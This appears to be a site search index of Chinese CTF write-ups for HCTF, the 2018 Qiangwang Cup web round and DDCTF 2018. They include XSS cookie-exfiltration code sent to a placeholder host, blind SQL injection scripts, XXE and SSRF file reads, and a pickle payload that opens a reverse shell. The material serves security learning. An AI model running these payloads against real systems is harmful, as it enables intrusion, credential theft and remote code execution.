不知道各位还记不记得去年HCTF的图片隐写题，去年的大一通信小学弟今年已经大二了。他从课堂上学会了音频隐写，并选了大家（wo）LP的一首歌准备在双11送给大家（虽然没几个人开到） 解题分析： 题目后来也放过hint: concentrate on the waveform 注意波形图用Audacity打开new_love_song.wav,基本近似于一种矩形:而正常的音频波形往往都是高低起伏的:所以我们就把波放大，能够发现：相隔特定的距离 就会出现一段直线。接触过的人肯定知道，直线波就是某一特定的值能够猜测 肯定有东西藏在其中，尝试提取出来，发现是一串01串 长度可开方 ，又是熟悉的转换二维码，扫描get flag 解题脚本： clc clear close all %% load data wm_sz = 20000; % watermark size px_sz = wm_sz/8; % number of pixels im_sz = sqrt(px_sz); % image size host_new = audioread ('new\\_love\\_song.wav'); % new (watermarked) host signal host_new = uint8(255*(host_new + 0.5)); % double \\[-0.5 +0.5\\] to 'uint8' \\[0 255\\] %% prepare host host_bin = dec2bin(host_new, 8); % binary host \\[n 8\\] %% extract watermark wm\\_bin\\_str = host_bin(1:wm_sz, 8); wm_bin = reshape(wm\\_bin\\_str, px_sz , 8); wm_str = zeros(px_sz, 1, 'uint8'); for i = 1:px_sz % extract water mark from the first plane of host wm_str(i, :) = bin2dec(wm_bin(i, :)); end wm = reshape(wm_str, im_sz , im_sz); %% show image imshow(wm) BabyRSA 先看下题目的逻辑 M = r * bytes\\_to\\_long('hctf{' + sha256(open('./flag').read()).hexdigest() + '}') S = pow(M, d, n) 程序接收 r，然后同 flag 相乘后计算出它的数字签名先说下本来的思路，flag 为 m，单纯 flag 的签名为 S，返回的签名为 S',如果我们构造 r=R^e因为所以 e 的值未知，通过爆破 e 的值遍历提交 R^e，再根据上式得出 flag 但是题目忘记对 r 进行限制，导致也可以通过传入 r=2 来做出因为 2m ，所以直接对 S'^e 除以 2 就是 m ps: Blue-Whale 队师傅的解法然后对 m^2 开方就是 flag 了 WeakRSA 已知部分 d 的最低有效位，是可以还原出 d 的，原理部分。但对于已知的位数是有要求的其中 M=2^k，k 是 d 的最低有效位的位数出题时没测试好，本来是要给的位数不够还原，需要爆破的，给下脚本 #!/usr/bin/python #\\-\\*\\- coding:utf-8 -*- import sys, re from libnum import nroot from Crypto.Util.number import size n = 24129492308224479830531863430667763206113500947912894148049103046436751018902380216549212087945014575866175372699327952352562583984599024982322742653474650254469019243745562427155195911292231061633627557914070970650388286259815766552728485153840458510677169495483383264554397982155108666923510839292748291941615629484247125025729363254239159271724680451974211566266307311323012908187153011368890695841034381925365547836453167672856111790684457634738536647974450864723943635507973978195453912898978987904396630176208142995219377309529324099766495068346782530074954504554550936100220114319876296005855618193837568032249 e = 65537 low_d2 = 585021050422437790400309277934736421671174903453118287773262727237276990096608684311252820485289582300237832073420122197911787329400438609843024619449229662477502424617432168933632994437196549098808097025413678738558952555239079729908003264517051128647960060385270607296895534639200191803399174999679917012421 low_bits = 1028 test = pow(3, e, n) i = 0 prefix = \\[\\] for a in range(2): for b in range(2): prefix.append(str(a) + str(b)) for bf in prefix: low_d = int(bin(low_d2)\\[2:\\], 2) for k in xrange(1, e): d = (k * n + 1) / e d >>= low_bits d 评论区 请文明评论，禁止广告 "},"articals/2018qiangwang.html":{"url":"articals/2018qiangwang.html","title":"2018强网杯Web","keywords":"","body":"2018第二届强网杯线上赛Web 题目类型： 类型 年份 难度 官方赛事题 2018 难 网上公开WP： http://www.cnblogs.com/iamstudy/articles/2th_qiangwangbei_ctf_writeup.html https://www.cnblogs.com/iamstudy/articles/2th_qiangwangbei_ctf_writeup.html https://xz.aliyun.com/t/2219 http://pupiles.com/qiangwangbei.html 题目下载： 暂无 本站备份WP： 感谢作者：l3m0n、FlappyPig、Pupil Web web签到 第一层： 这里可以用2个字符串绕过 param1=240610708&param2=QNKCDZO 第二层: 使用了强等于，那么使用数组绕过 param1[]=1&param2[]=2使用了强制字符串转化一番谷歌后发现这是去年BKPCTF改的一道题payload如下: Param1=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2 Param2=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2 注：上述两个字符串其md5加密后密文相同。 Share your mind 这题必须要写一下自己的踩坑经历，首先进去浏览一下页面功能，有个提交bug页面的地方，还有个可以新建文章的地方 最后就是浏览文章(但是只能浏览自己发的文章)，首先想到的就是xss+csrf，新建一个文章引用一段JS然后发给bot，然后ajax请求admin的文章发回来。可是按照这个思路我们发现在新建文章页面我们的<>被过滤了，所以我们不能直接构造一个js。猜想能不能在report页面里进行xss，但是发现存在过滤，只能像自己网站的地址发起请求，但是”居然”可以绕过!!!!!!,payload: http://39.107.33.96:20000/index.php/report/ 于是无尽的踩坑之旅开始了，首先是bot返回结果没有cookie，一开始也没在意以为设置了httponly,(后来大致明白bot过程了,先check url-未读,然后add_cookie-已读，这里直接用标签其实是在add_cookie之前就返回了所以不带cookie)让他AJAX请求访问admin的文章，代码如下 var a = new XMLHttpRequest(); a.open('GET', 'index.php/view/article/1', false); a.send(null); b = a.responseText; (new Image()).src = 'http://xxxxx/?flag=' + escape(b); 结果bot返回结果是未登录，然后我就很懵逼，后来给了hint1:phantomjs/2.1.1结果这提示给了以后我就以为是日bot，各种谷歌找2.1.1的漏洞，一直到下午出了hint2:漏洞点不在report…推翻了一个下午的努力成果。一直到晚上我才想起来index页面有一个../static/js/bootstrap.min.js的相对路径引用 想起来寒假时候看的rpo，关于rpo的原理这里不想赘述了，给个连接 https://open.appscan.io/article-462.html 这里文章查看页面没有引用DOCTYPE html，所以存在rpo漏洞,新建一个文章,文章title为空(title不为空的时候会添加一个标签导致浏览器解析js的时候报错 内容输入js代码比如alert(1) 然后访问这 http://39.107.33.96:20000/index.php/view/article/635/..%2f..%2f..%2f..%2findex.php 把635替换成你的文章代码,这里对于服务器来说访问的是 http://39.107.33.96:20000/index.php 但是对于浏览器来说他访问的就是 http://39.107.33.96:20000/index.php/view/article/635/..%2f..%2f..%2f..%2findex.php 然后这个时候浏览器会发起js请求去请求原本index.php会加载的../static/js/bootstrap.min.js就是向 http://39.107.33.96:20000/index.php/view/article/635/..%2f..%2f..%2f..%2findex.php/../static/js/bootstrap.min.js 相当于 http://39.107.33.96:20000/index.php/view/article/635/static/bootstrap.min.js 这里访问的结果和访问 http://39.107.33.96:20000/index.php/view/article/635/ 也就是你的文章的内容是一样的(不明白的可以自己本地测试)，不同的是浏览器是以js引擎去解析你的文章的，也就是会把你的文章当成一段js去执行。所以这里就可以绕过<>的过滤执行xss了。 所以我们新建一个文章内容为 var a = new XMLHttpRequest(); a.open('GET', 'yourvpsip', false); a.send(null); 然后用浏览器访问 http://39.107.33.96:20000/index.php/view/article/22957/..%2f..%2f..%2f..%2findex.php 然后这里发现居然没有发起请求，查看源码发现是过滤了\"和'，然后我就自作聪明的用反引号，然后我就陷入了无尽的玄学道路，我发现本地浏览器，vsp就可以收到请求 但是提交给bot就收不到请求，然后我就一直在这里卡了超级长的时间，期间还问了出题人,bot等问题…直到晚上用String.fromCharCode才解决了这个玄学问题(这个点真心卡了我好久),后面就比较简单了收到请求后发现cookie有提示 联想到国赛的一道读取子目录cookie的题目 https://www.lorexxar.cn/2017/07/11/guosai2017/ 脚本拿来改了改就可以get子目录cookie了 var iframe = document.createElement(\"iframe\"); iframe.src = \"/QWB_f14g/QWB\"; iframe.id = \"frame\"; document.body.appendChild(iframe); iframe.onload = function (){ var c = document.getElementById('frame').contentWindow.document.cookie; var n0t = document.createElement(\"link\"); n0t.setAttribute(\"rel\", \"prefetch\"); n0t.setAttribute(\"href\", \"//xxx/?\" + c); document.head.appendChild(n0t); } 然后把所有引号之间的内容用String.fromcode()编码一下 Three hit 进去后发现功能很少，猜测二次注入，发现username有正则限制，那么测试age，发现必须整数，这里可以用16进制绕过，测试一番后发现是个盲注 找了个脚本改了下 import requests import binascii url_register = \"http://39.107.32.29:10000/index.php?func=register\" url_login = \"http://39.107.32.29:10000/index.php?func=login\" result = '[*]result:' for i in range(1, 65): for j in range(32, 127): age = \"1223 or ascii(substr((select flag from flag limit 1),{0},1))={1}#\".format(str(i), str(j)) age = binascii.hexlify(bytes(age, 'utf8')) age = \"0x\" + str(age, \"utf8\") username = \"pupiles{0}{1}\".format(str(i), str(j)) data = { \"username\": username, \"password\": \"123456\", \"age\": age } while True: try: resp1 = requests.post(url=url_register, data=data, allow_redirects=False) break except Exception as e: continue while True: try: resp2 = requests.post(url=url_login, data=data, allow_redirects=True) if \"123\" in resp2.text: result += chr(j) print(result) break except Exception as e: continue 盲注跑出flag Wechat 出题人给出了公众后后面的地址，查看微信公众号的SDK可以发现可以通过一些xml数据进行发送 import requests url = \"http://39.107.33.77/\" content = \"Test http://www.baidu.com TEAMKEY icq3be93d38562e68bc0a86368c2d6b2\" data = ''' 1348831860 1234567890123456 1 ''' % content print requests.post(url,data=data).content 通过提示存在注入，可以得到以下信息 1521882365 1234567890123456 绑定host: wc.qwb.com 的ip为39.107.33.77 其中message存在注入，限制的比较严格 POST /leave_message.php HTTP/1.1 Host: wc.qwb.com:8088 user=aaaaaaaaaaaaaaa&email=aaaa@qq.com&team=icq3be93d38562e68bc0a86368c2d6b2&message=1'-(sleep(ceil(pi())))-'1&submit=submit 比如sleep函数参数里面不能用数字，可以使用pi()来绕过，另外就是select from部分。 message=12333'-(if(ascii(substring((select@b:=group_concat(username)from{cl0und.adminuser}),%s,1))like'%s',sleep(pi()),0))-'1 这里字段都需要猜解，猜不到password字段 http://wc.qwb.com:8088/forgetpassword.php 利用密码找回功能，注入出code，找回管理员密码 进入后台后，发现有一段上传处，主要用于用户的头像上传。 文件上传后便会将图片的内容显示出来。 再往后面看htm中有一段注释。 其中urlink存在ssrf漏洞，没有限制协议以及后面的字符，当然大部分的特殊符号不能用，只能读取一些配置文件。 POST /getimg.php HTTP/1.1 Host: wc.qwb.com:8088 Cookie: PHPSESSID=cjq7naar02kajivdftljhj2h44 ------WebKitFormBoundaryOXFwabnsGhrKdxyn Content-Disposition: form-data; name=\"urlink\" file://wc.qwb.com:8088/etc/apache2/apache2.conf ------WebKitFormBoundaryOXFwabnsGhrKdxyn-- 读取到apache的配置文件，可以看到内容。很郁闷，比赛的时候读取了这个文件，但是base64的内容没取完整导致没看到这部分，还是需要细心… # # Port 23333 # Options Indexes FollowSymLinks # AllowOverride None # Require all granted # Here is a Bin with its libc # 剩下的就是文件读取pwn程序，然后pwnpwnpwn了，太菜了，不会做。 教育机构 这个题目其实特别懵逼，给了一个域名，还以为是要来一场真实环境渗透题，所以信息收集方面都做了。比如扫二级域名，扫端口，扫文件(一扫就被ban) 80端口看的实在懵逼，毫无头绪。就看了一下33899端口的东西，有一个.idea的泄露，但是并没有什么用。 http://39.107.33.75:33899/.idea/workspace.xml 内容被注释了一段xm调用实体的变量，有点想xxe。 还有一个地方就是提交评论的地方，但是无论怎么样写入都是alert(\"未知错误！！！请重试\") 传入数组的时候发现出现问题了。 comment处有被userdecode处理过，试一下xml头，就可以看到有报错，考点应该就是xxe。 通过盲xxe，可以获取到文件。 远程服务器布置一个1.xml \"> %int; %trick; comment再进行调用 %remote; ]> 获取一下/var/www/52dandan.cc/public_html/config.php 拿到了一半的flag Ok,you get the first part of flag : 5bdd3b0ba1fcb40 then you can do more to get more part of flag 这里出现了一个问题，就是获取/var/www/52dandan.cc/public_html/common.php的时候出现了Detected an entity reference loop错误。 查了一下资料，libxml解析器默认限制外部实体长度为2k，没法突破，只能寻找一下压缩数据方面的。php过滤器中提供了一个zlib.inflate压缩数据。 压缩：echo file_get_contents(\"php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd\"); 解压：echo file_get_contents(\"php://filter/read=convert.base64-decode/zlib.inflate/resource=/tmp/1\"); 这样就可以获取到common.php文件源码了! 再获取一下机器的一些ip信息，其中arp信息中保留了一个内网地址 /proc/net/arp /etc/host IP address HW type Flags HW address Mask Device 192.168.223.18 0x1 0x2 02:42:c0:a8:df:12 * eth0 192.168.223.1 0x1 0x2 02:42:91:f9:c9:d4 * eth0 开放了一个80端口，test.php的shop参数存在注入 \"> %int; %trick; 做不动了，不想做了。 2333，学习了一个防止扫描器的姿势，如果扫描器爬到test.php，当然对一般的目录扫描效果不大，一般都是HEAD请求。 test.php know it then do it Python is the best language 1/2 http://39.107.32.29:20000 http://117.50.16.51:20000 下载地址 备用下载地址（密码：rtou） I'm learning the flask recently,and I think python is the best language in the world!don't you think so? Python is the best language 解法一 源码下载下来后，由于是基于flask框架，因此先看了看路由文件routes.py，大概如下： @app.before_request def before_request(): @app.teardown_request def shutdown_session(exception=None): @app.route('/', methods=\\['GET', 'POST'\\]) @app.route('/index', methods=\\['GET', 'POST'\\]) @login_required def index(): @app.route('/explore') @login_required def explore(): @app.route('/logout') def logout(): @app.route('/register', methods=\\['GET', 'POST'\\]) def register(): @app.route('/user/') @login_required def user(username): @app.route('/edit_profile', methods=\\['GET', 'POST'\\]) @login_required def edit_profile(): @app.route('/follow/') @login_required def follow(username): @app.route('/unfollow/') @login_required def unfollow(username): 这些功能大部分是基于登陆的，因此从注册和登陆相关的代码入手。 @app.route('/register', methods=\\['GET', 'POST'\\]) def register(): if current_user.is_authenticated: return redirect(url_for('index')) form = RegistrationForm() if form.validate\\_on\\_submit(): res = mysql.Add(\"user\", \\[\"NULL\", \"'%s'\" % form.username.data, \"'%s'\" % form.email.data, \"'%s'\" % generate\\_password\\_hash(form.password.data), \"''\", \"'%s'\" % now()\\]) if res == 1: flash('Congratulations, you are now a registered user!') return redirect(url_for('login')) return render_template('register.html', title='Register', form=form) 跟进RegistrationForm，定义在 forms.py的第20行: class RegistrationForm(FlaskForm): username = StringField('Username', validators=\\[DataRequired()\\]) email = StringField('Email', validators=\\[DataRequired(), Email()\\]) password = PasswordField('Password', validators=\\[DataRequired()\\]) password2 = PasswordField( 'Repeat Password', validators=\\[DataRequired(), EqualTo('password')\\]) submit = SubmitField('Register') def validate_username(self, username): if re.match(\"^\\[a-zA-Z0-9_\\]+$\", username.data) == None: raise ValidationError('username has invalid charactor!') user = mysql.One(\"user\", {\"username\": \"'%s'\" % username.data}, \\[\"id\"\\]) if user != 0: raise ValidationError('Please use a different username.') def validate_email(self, email): user = mysql.One(\"user\", {\"email\": \"'%s'\" % email.data}, \\[\"id\"\\]) if user != 0: raise ValidationError('Please use a different email address.') 在这里可以很明显的看到两个验证函数有差别，validate_username在进行mysql.One前进行了正则匹配的过滤和审核，而validate_email仅仅通过validators=[DataRequired(), Email()]来匹配。 Email定义在wtforms.validators中，相关源码如下： class Email(Regexp): \"\"\" Validates an email address. Note that this uses a very primitive regular expression and should only be used in instances where you later verify by other means, such as email activation or lookups. :param message: Error message to raise in case of a validation error. \"\"\" def \\_\\_init\\_\\_(self, message=None): self.validate_hostname = HostnameValidation( require_tld=True, ) super(Email, self).\\_\\_init\\_\\_(r'^.+@(\\[^.@\\]\\[^@\\]+)$', re.IGNORECASE, message) def \\_\\_call\\_\\_(self, form, field): message = self.message if message is None: message = field.gettext('Invalid email address.') match = super(Email, self).\\_\\_call\\_\\_(form, field, message) if not self.validate_hostname(match.group(1)): raise ValidationError(message) 其正则规则为^.+@([^.@][^@]+)$，也就是说对email而言，即使提交如'\"#a@q.com包含单引号，双引号，注释符等敏感字符的形式也是能通过的。 回到validate_email验证函数中： def validate_email(self, email): user = mysql.One(\"user\", {\"email\": \"'%s'\" % email.data}, \\[\"id\"\\]) if user != 0: raise ValidationError('Please use a different email address.') 跟入mysql.One，定义在others.py: \\# mysql.One(\"user\", {\"email\": \"'%s'\" % email.data}, \\[\"id\"\\]) def One(self, tablename, where={}, feildname=\\[\"*\"\\], order=\"\", where_symbols=\"=\", l=\"and\"): \\# self.Sel(\"user\", {\"email\": \"'%s'\" % email.data}, \\[\"id\"\\], \"\", \"=\", l) sql = self.Sel(tablename, where, feildname, order, where_symbols, l) try: res = self.db_session.execute(sql).fetchone() if res == None: return 0 return res except: return -1 跟入self.Sel: \\# self.Sel(\"user\", {\"email\": \"'%s'\" % email.data}, \\[\"id\"\\], \"\", \"=\", l) def Sel(self, tablename, where={}, feildname=\\[\"*\"\\], order=\"\", where_symbols=\"=\", l=\"and\"): sql = \"select \" sql += \"\".join(i + \",\" for i in feildname)\\[:-1\\] + \" \" sql += \"from \" + tablename + \" \" if where != {}: sql += \"where \" + \"\".join(i + \" \" + where_symbols + \" \" + str(where\\[i\\]) + \" \" + l + \" \" for i in where)\\[:-4\\] if order != \"\": sql += \"order by \" + \"\".join(i + \",\" for i in order)\\[:-1\\] return sql 最后拼接出来的sql语句如下： select id from user where email = 'your input email' 结合前面所说的对输入邮箱email形式的验证，这里存在sql注入漏洞。我们设置邮箱为test'/**/or/**/1=1#@test.com，则拼接后的sql语句为： select id from user where email = 'test'/**/or/**/1=1#@test.com' 可以看到成功注入。由于此处不能回显数据，因此采用盲注。回到validate_username def validate_username(self, username): if re.match(\"^\\[a-zA-Z0-9_\\]+$\", username.data) == None: raise ValidationError('username has invalid charactor!') user = mysql.One(\"user\", {\"username\": \"'%s'\" % username.data}, \\[\"id\"\\]) if user != 0: raise ValidationError('Please use a different username.') 当查询为真时也即user != 0会出现信息Please use a different username.，结合这点构造出最后的exp.py： import requests from bs4 import BeautifulSoup url = \"http://39.107.32.29:20000/register\" r = requests.get(url) soup = BeautifulSoup(r.text,\"html5lib\") token = soup.find_all(id='csrf_token')\\[0\\].get(\"value\") notice = \"Please use a different email address.\" result = \"\" database = \"(SELECT/**/GROUP\\_CONCAT(schema\\_name/**/SEPARATOR/**/0x3c62723e)/**/FROM/**/INFORMATION_SCHEMA.SCHEMATA)\" tables = \"(SELECT/**/GROUP\\_CONCAT(table\\_name/**/SEPARATOR/**/0x3c62723e)/**/FROM/**/INFORMATION\\_SCHEMA.TABLES/**/WHERE/**/TABLE\\_SCHEMA=DATABASE())\" columns = \"(SELECT/**/GROUP\\_CONCAT(column\\_name/**/SEPARATOR/**/0x3c62723e)/**/FROM/**/INFORMATION\\_SCHEMA.COLUMNS/**/WHERE/**/TABLE\\_NAME=0x666c616161616167)\" data = \"(SELECT/**/GROUP_CONCAT(flllllag/**/SEPARATOR/**/0x3c62723e)/**/FROM/**/flaaaaag)\" for i in range(1,100): for j in range(32,127): payload = \"test'/**/or/**/ascii(substr(\"+ data +\",%d,1))=%d#/**/@chybeta.com\" % (i,j) print payload post_data = { 'csrf_token': token, 'username': 'a', 'email':payload, 'password':'a', 'password2':'a', 'submit':'Register' } r = requests.post(url,data=post_data) soup = BeautifulSoup(r.text,\"html5lib\") token = soup.find_all(id='csrf_token')\\[0\\].get(\"value\") if notice in r.text: result += chr(j) print result break 由于在注册部分有csrf_token，因此在每次submit时要记得带上，同时在每次返回的页面中取得下一次的csrf_token。 最后的flag：QWB{us1ng_val1dator_caut1ous} 解法二 接着进行代码审计。在others.py的最后有这样的内容： black\\_type\\_list = \\[eval, execfile, compile, system, open, file, popen, popen2, popen3, popen4, fdopen, tmpfile, fchmod, fchown, pipe, chdir, fchdir, chroot, chmod, chown, link, lchown, listdir, lstat, mkfifo, mknod, mkdir, makedirs, readlink, remove, removedirs, rename, renames, rmdir, tempnam, tmpnam, unlink, walk, execl, execle, execlp, execv, execve, execvp, execvpe, exit, fork, forkpty, kill, nice, spawnl, spawnle, spawnlp, spawnlpe, spawnv, spawnve, spawnvp, spawnvpe, load, loads\\] class FilterException(Exception): def \\_\\_init\\_\\_(self, value): super(FilterException, self).\\_\\_init\\_\\_( 'the callable object {value} is not allowed'.format(value=str(value))) def \\_hook\\_call(func): def wrapper(*args, **kwargs): print args\\[0\\].stack if args\\[0\\].stack\\[-2\\] in black\\_type\\_list: raise FilterException(args\\[0\\].stack\\[-2\\]) return func(*args, **kwargs) return wrapper def load(file): unpkler = Unpkler(file) unpkler.dispatch\\[REDUCE\\] = \\_hook\\_call(unpkler.dispatch\\[REDUCE\\]) return Unpkler(file).load() 我把这部分内容分为两部分；反序列化漏洞以及基本的沙箱逃逸问题。 先忽略unpkler.dispatch[REDUCE]这一行的内容。 from pickle import Unpickler as Unpkler def load(file): unpkler = Unpkler(file) \\# unpkler.dispatch\\[REDUCE\\] = \\_hook\\_call(unpkler.dispatch\\[REDUCE\\]) return Unpkler(file).load() 这里对file进行了反序列化，因此如果file可控即可造成危险。 用下面的脚本(exp4.py)进行序列化payload的生成： import os from pickle import Pickler as Pkler import commands class chybeta(object): def \\_\\_reduce\\_\\_(self): return (os.system,(\"whoami\",)) evil = chybeta() def dump(file): pkler = Pkler(file) pkler.dump(evil) with open(\"test\",\"wb\") as f: dump(f) 测试反序列化漏洞(exp5.py): from pickle import Unpickler as Unpkler from io import open as Open def LOAD(file): unpkler = Unpkler(file) return Unpkler(file).load() with Open(\"test\",\"rb\") as f: LOAD(f) 不过没那么简单，源码还设置了沙箱/黑名单来防止某些函数的执行，比如前面的os.system就被禁用了，我们修改exp5.py为进一步的测试： from os import * from sys import * from pickle import * from io import open as Open from pickle import Unpickler as Unpkler from pickle import Pickler as Pkler black\\_type\\_list = \\[eval, execfile, compile, system, open, file, popen, popen2, popen3, popen4, fdopen, tmpfile, fchmod, fchown, pipe, chdir, fchdir, chroot, chmod, chown, link, lchown, listdir, lstat, mkfifo, mknod, mkdir, makedirs, readlink, remove, removedirs, rename, renames, rmdir, tempnam, tmpnam, unlink, walk, execl, execle, execlp, execv, execve, execvp, execvpe, exit, fork, forkpty, kill, nice, spawnl, spawnle, spawnlp, spawnlpe, spawnv, spawnve, spawnvp, spawnvpe, load, loads\\] class FilterException(Exception): def \\_\\_init\\_\\_(self, value): super(FilterException, self).\\_\\_init\\_\\_( 'the callable object {value} is not allowed'.format(value=str(value))) def \\_hook\\_call(func): def wrapper(*args, **kwargs): print args\\[0\\].stack if args\\[0\\].stack\\[-2\\] in black\\_type\\_list: raise FilterException(args\\[0\\].stack\\[-2\\]) return func(*args, **kwargs) return wrapper def LOAD(file): unpkler = Unpkler(file) unpkler.dispatch\\[REDUCE\\] = \\_hook\\_call(unpkler.dispatch\\[REDUCE\\]) return Unpkler(file).load() with Open(\"test\",\"rb\") as f: LOAD(f) 此时如果简单地想通过前一步生成的test来执行系统命令，会报错。 考虑其他方法。python中除了os和sys模块有提供命令执行的函数外，还有其他第三方模块，比如commands模块： 因此改写生成序列化文件的exp4.py如下： import os from pickle import Unpickler as Unpkler from pickle import Pickler as Pkler import commands class chybeta(object): def \\_\\_reduce\\_\\_(self): return (commands.getoutput,(\"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF\\_INET,socket.SOCK\\_STREAM);s.connect((\\\\\"127.0.0.1\\\\\",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(\\[\\\\\"/bin/sh\\\\\",\\\\\"-i\\\\\"\\]);'\",)) evil = chybeta() def dump(file): pkler = Pkler(file) pkler.dump(evil) with open(\"test\",\"wb\") as f: dump(f) 同时为了进一步利用，我们尝试反弹shell。过程如下，先运行exp4.py生成新的test序列化文件，接着nc监听本地端口，接着运行exp5.py触发序列化漏洞并完成利用 不过该怎么控制源代码中的load(file)的file呢？通过全局搜索关键字，在Mycache.py的FileSystemCache类中有多次引用，比如定义在第137行的get方法： def get(self, key): filename = self.\\_get\\_filename(key) try: with open(filename, 'rb') as f: pickle_time = load(f) if pickle_time == 0 or pickle_time >= time(): a = load(f) return a else: os.remove(filename) return None except (IOError, OSError, PickleError): return None 跟入_get_filename方法： def \\_get\\_filename(self, key): if isinstance(key, text_type): key = key.encode('utf-8') \\# XXX unicode review hash = md5(key).hexdigest() return os.path.join(self._path, hash) 可以看到将传入的字符串key进行MD5，并将其返回。不过这个key在哪里定义？通过全局搜索，不难发现在Mysession.py的open_session中进行了调用： class FileSystemSessionInterface(SessionInterface): ... def \\_\\_init\\_\\_(self, cache_dir, threshold, mode, key_prefix=\"bdwsessions\", use_signer=False, permanent=True): self.cache = FileSystemCache(cache_dir, threshold=threshold, mode=mode) self.key_prefix = key_prefix self.use_signer = use_signer self.permanent = permanent def open_session(self, app, request): \\# 从cookie中获取到sid \\# 格式 Cookie: session=675b6ec7-95bd-411f-a59d-4c3db5929604 \\# sid 即为 675b6ec7-95bd-411f-a59d-4c3db5929604 sid = request.cookies.get(app.session\\_cookie\\_name) if not sid: sid = self.\\_generate\\_sid() return self.session_class(sid=sid, permanent=self.permanent) ... data = self.cache.get(self.key_prefix + sid) if data is not None: return self.session_class(data, sid=sid) return self.session_class(sid=sid, permanent=self.permanent) ... 其中self.key_prefix即为bdwsessions，因此假设cookie中的sesssion值为675b6ec7-95bd-411f-a59d-4c3dbchybeta，则self.key_prefix + sid即为bdwsessions675b6ec7-95bd-411f-a59d-4c3dbchybeta，然后这串字符串进行MD5得到的结果78f634977cbacf167dfd9656fe9dd5f3即为675b6ec7-95bd-411f-a59d-4c3dbchybeta对应的session文件名。 同时根据config.py: SQLALCHEMY\\_DATABASE\\_URI = \"mysql://root:password@localhost/flask?charset=utf8\" SESSION\\_FILE\\_DIR = \"/tmp/ffff\" 可以知道session文件的保存路径在/tmp/ffff，以及用户为root，因此具有文件导出的权限的可能性很大。 流程 结合Python is the best language 1中的sql注入漏洞，我们梳理出如下的攻击流程： 本地生成序列化文件，并且进行十六进制编码 通过sql注入漏洞outfile出session文件 访问index，同时带上session文件对应的session值，触发open_session中的self.cache.get，进行反序列化攻击 假设前面生成的序列化文件存在于/tmp/ffff/chybeta，建议使用mysql的hex转码来进行十六进制的转换: mysql> select hex(load_file('/tmp/ffff/chybeta')) into outfile '/tmp/ffff/exp'; Query OK, 1 row affected (0.00 sec) 以使用675b6ec7-95bd-411f-a59d-4c3dbchybeta作为cookie为例，则其session文件存在于/tmp/ffff/78f634977cbacf167dfd9656fe9dd5f3 在十六进制的序列化串前面添加0x，构造邮箱处的注入点： select id from user where email = 'test'/**/union/**/select/**/0x63636F6D6D616E64730A../**/into/**/dumpfile/**/'/tmp/ffff/78f634977cbacf167dfd9656fe9dd5f3'#@test.com' 也即在注册的邮箱处填入： test'/**/union/**/select/**/0x63636F6D6D616E64730A.../**/into/**/dumpfile/**/'/tmp/ffff/78f634977cbacf167dfd9656fe9dd5f3'#@test.com 点击submit后出现Please use a different email address.。 接着在burp中抓取访问index的包，并修改cookie为675b6ec7-95bd-411f-a59d-4c3dbchybeta，在自己的vps上监听对应的端口： flag：QWB{pyth0n1s1ntere3t1ng} 总结: wtforms.validators的Email类验证不完善 flask的session处理机制 python沙箱逃逸 python反序列化漏洞 一点“小小”的脑洞 Refference: P师傅：Python库WTForm过滤不严导致URLXSS漏洞 评论区 请文明评论，禁止广告 "},"articals/2018ddctf.html":{"url":"articals/2018ddctf.html","title":"2018DDCTF","keywords":"","body":"2018DDCTF滴滴高校闯关赛 题目类型： 类型 年份 难度 官方赛事题 2018 中 网上公开WP： https://impakho.com/post/ddctf-2018-writeup http://blog.5am3.com/2018/04/24/ddctf2018/ https://www.jianshu.com/p/e6b66c27bdfd https://www.anquanke.com/post/id/144879 http://www.leadroyal.cn/?p=466 https://www.anquanke.com/post/id/145553 题目下载: Android题目文件下载 ：https://github.com/LeadroyaL/attachment_repo/tree/master/didictf_2018 本站备份WP： 感谢作者：奈沙夜影、5am3、LeadroyaL、impakho WEB 感谢5am3师傅 ！ 数据库的秘密 [注意] 本次DDCTF所有WEB题无需使用也禁止使用扫描器 http://116.85.43.88:8080/JYDJAYLYIPHCJMOQ/dfe3ia/index.php 打开后会发现返回如下。 非法链接，只允许来自 123.232.23.245 的访问 此时可以通过修改HTTP请求头中的X-Forwarded-For即可。即添加以下字段 X-Forwarded-For:123.232.23.245 在这里，我用的是火狐的一个插件Modify Header Value (HTTP Headers)。 发现该网页是一个简单的查询列表。再加上题目中给的hint。可以判断为SQL注入题目。 经过测试，发现以上三个点均不是注入点。此时分析数据包，可以发现存在第四个注入点。 然后查看源码，发现一个隐藏字段。经过测试发现，该字段可以注入。 admin' && '1'='1'# admin' && '1'='2'# 尝试注入 author，可以发现以下内容信息 and （可以用&&代替） union select （很迷，这两个不能同时出现，然而自己又找不到其他方式） 仅允许#号注释 然后注入渣的自己就比较无奈了。。不会啊。只好祭出盲注大法了。经过尝试，最终构造以下payload可用。 admin' && binary substr((select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA),1,1) 然后开始写脚本，此时遇到了一个问题。发现他有一个验证。为了check你中途是否修改数据，而加入的一个hash比对。 首先将你的准备传送的内容进行某种hash后变为sig字段，然后再将sig通过get请求一起发送过去。此时服务器端会将sig与你发送的内容的hash比对一下。此时可以减少抓包中途修改内容的可能性。 所以，为了省事，我选择直接将这个代码调用一下。 用python的execjs库，可以直接执行js代码。 最终跑起脚本，获取到flag DDCTF{IKIDLHNZMKFUDEQE} 专属链接 题目： 现在，你拿到了滴滴平台为你同学生成的专属登录链接，但是你能进一步拿到专属他的秘密flag么 提示1：虽然原网站跟本次CTF没有关系，原网站是www.xiaojukeji.com 注：题目采用springmvc+mybatis编写，链接至其他域名的链接与本次CTF无关，请不要攻击 http://116.85.48.102:5050/welcom/3fca5965sd7b7s4a71s88c7se658165a791e 解答： 首先打开网站，发现是滴滴的官网。。 此时发现所有连接几乎全部重定向到了滴滴官网。 无奈下查看元素。发现hint 